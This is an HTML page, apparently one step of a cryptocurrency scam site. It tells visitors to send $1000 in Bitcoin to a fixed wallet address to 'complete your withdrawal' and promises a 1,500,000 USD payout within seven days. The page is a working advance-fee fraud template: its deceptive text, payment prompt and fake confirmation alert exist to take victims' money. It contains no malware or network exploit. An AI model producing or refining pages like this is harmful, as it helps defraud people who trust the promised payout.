<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Payment</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
        input, button { padding: 10px; margin: 10px; width: 80%; }
    </style>
</head>
<body>
    <h1>Bitcoin Payment</h1>
    <p>To complete your withdrawal, send <strong>$1000 in Bitcoin</strong> to the wallet below:</p>
    
    <p><strong>Wallet Address:</strong></p>
    <input type="text" id="wallet" value="1Ef2TvxcroHXHFYSqftfCch6bDi6FtAWNw" readonly>
    <button onclick="copyWallet()">Copy Wallet Address</button>

    <p><strong>Important:</strong> Always copy and paste the wallet address to avoid mistakes.</p>

    <h3>Enter your Bitcoin wallet address to receive your benefits:</h3>
    <input type="text" id="userWallet" placeholder="Your Bitcoin Wallet Address">
    <button onclick="confirmPayment()">Confirm Payment</button>

    <script>
        function copyWallet() {
            let wallet = document.getElementById("wallet");
            wallet.select();
            document.execCommand("copy");
            alert("Wallet address copied!");
        }

        function confirmPayment() {
            let userWallet = document.getElementById("userWallet").value;
            if (userWallet.trim() === "") {
                alert("Please enter your Bitcoin wallet address!");
            } else {
                let amount = localStorage.getItem("withdrawAmount") || "1,500,000";
                alert(`Payment confirmed! You will receive ${amount.toLocaleString()} USD in Bitcoin within 7 days.`);
                window.location.href = "5-success.html";
            }
        }
    </script>
</body>
</html>
